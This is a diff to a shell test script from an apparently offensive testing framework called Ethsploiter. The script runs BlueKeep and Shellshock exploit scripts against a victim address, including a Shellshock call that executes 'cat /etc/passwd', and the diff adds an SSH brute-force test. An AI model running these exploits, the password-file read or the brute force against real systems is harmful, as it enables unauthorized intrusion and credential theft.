@@ -79,3 +79,7 @@ checkPort 3389 python3 $ETHSPLOITER_PATH/exploits/windows/bluekeep/win7_32_poc.p
 # Linux
 testInfo "shellshock_Apache_CGI"
 checkPort 80 $ETHSPLOITER_PATH/exploits/multi/shellshock/shellshock_mod_cgi_bash_exec.sh $VICTIM_ADDRESS /cgi-bin/hw.cgi \"cat /etc/passwd\"
+
+#multi
+testInfo "ssh_brute_force"
+checkPort 22 /root/Dokumenty/Ethsploiter/exploits/multi/ssh/login/ssh_brute.sh $VICTIM_ADDRESS
